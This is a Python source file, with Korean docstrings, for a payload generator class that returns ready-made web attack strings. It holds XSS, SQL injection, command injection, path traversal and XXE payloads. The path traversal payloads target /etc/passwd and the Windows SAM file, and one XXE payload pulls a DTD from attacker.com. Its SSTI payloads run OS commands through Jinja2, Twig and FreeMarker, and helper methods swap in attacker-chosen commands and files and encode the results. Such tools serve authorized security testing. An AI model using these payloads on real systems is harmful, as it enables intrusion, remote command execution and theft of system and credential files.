import random
import string
import base64
import urllib.parse
from typing import List, Dict, Optional, Union

class PayloadGenerator:
    def __init__(self):
        self.common_xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select autofocus onfocus=alert('XSS')>",
            "<textarea autofocus onfocus=alert('XSS')>",
            "<keygen autofocus onfocus=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio><source onerror=alert('XSS')>"
        ]
        
        self.common_sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--"
        ]
        
        self.common_command_injection_payloads = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "'; ls #",
            "\"; ls #",
            "'; ls --",
            "\"; ls --"
        ]
        
        self.common_path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%c1%9c..%c1%9c..%c1%9cetc/passwd"
        ]
        
        self.common_xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root></root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>'
        ]
        
        self.common_ssti_payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{self.__dict__}}',
                '{{request.environ}}',
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}',
                '{{_self.env.getFilter("id")}}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
                '${"freemarker.template.utility.Execute"?new()("id")}'
            ]
        }

    def generate_xss_payload(self, custom_alert: Optional[str] = None) -> str:
        """XSS 페이로드를 생성합니다."""
        if custom_alert:
            return random.choice(self.common_xss_payloads).replace("XSS", custom_alert)
        return random.choice(self.common_xss_payloads)

    def generate_sql_payload(self, table_name: Optional[str] = None) -> str:
        """SQL 인젝션 페이로드를 생성합니다."""
        payload = random.choice(self.common_sql_payloads)
        if table_name:
            payload = payload.replace("NULL", f"table_name FROM {table_name}")
        return payload

    def generate_command_injection_payload(self, command: Optional[str] = None) -> str:
        """명령어 인젝션 페이로드를 생성합니다."""
        if command:
            return random.choice(self.common_command_injection_payloads).replace("ls", command)
        return random.choice(self.common_command_injection_payloads)

    def generate_path_traversal_payload(self, target_file: Optional[str] = None) -> str:
        """경로 순회 페이로드를 생성합니다."""
        if target_file:
            return random.choice(self.common_path_traversal_payloads).replace("passwd", target_file)
        return random.choice(self.common_path_traversal_payloads)

    def generate_xxe_payload(self, target_file: Optional[str] = None) -> str:
        """XXE 페이로드를 생성합니다."""
        if target_file:
            return random.choice(self.common_xxe_payloads).replace("passwd", target_file)
        return random.choice(self.common_xxe_payloads)

    def generate_ssti_payload(self, template_engine: str, command: Optional[str] = None) -> str:
        """서버 사이드 템플릿 인젝션 페이로드를 생성합니다."""
        if template_engine.lower() not in self.common_ssti_payloads:
            raise ValueError(f"지원하지 않는 템플릿 엔진: {template_engine}")
        
        payloads = self.common_ssti_payloads[template_engine.lower()]
        if command:
            return random.choice(payloads).replace("id", command)
        return random.choice(payloads)

    def generate_encoded_payload(self, payload: str, encoding_type: str = "base64") -> str:
        """페이로드를 인코딩합니다."""
        if encoding_type.lower() == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type.lower() == "url":
            return urllib.parse.quote(payload)
        elif encoding_type.lower() == "html":
            return "".join([f"&#{ord(c)};" for c in payload])
        else:
            raise ValueError(f"지원하지 않는 인코딩 타입: {encoding_type}")

    def generate_random_payload(self, length: int = 10) -> str:
        """무작위 페이로드를 생성합니다."""
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))

    def generate_custom_payload(self, pattern: str, replacements: Dict[str, str]) -> str:
        """사용자 정의 패턴에 따라 페이로드를 생성합니다."""
        payload = pattern
        for key, value in replacements.items():
            payload = payload.replace(key, value)
        return payload

    def generate_all_payloads(self) -> Dict[str, List[str]]:
        """모든 유형의 페이로드를 생성합니다."""
        return {
            'xss': [self.generate_xss_payload() for _ in range(5)],
            'sql': [self.generate_sql_payload() for _ in range(5)],
            'command_injection': [self.generate_command_injection_payload() for _ in range(5)],
            'path_traversal': [self.generate_path_traversal_payload() for _ in range(5)],
            'xxe': [self.generate_xxe_payload() for _ in range(3)],
            'ssti': {
                'jinja2': [self.generate_ssti_payload('jinja2') for _ in range(3)],
                'twig': [self.generate_ssti_payload('twig') for _ in range(3)],
                'freemarker': [self.generate_ssti_payload('freemarker') for _ in range(3)]
            }
        } 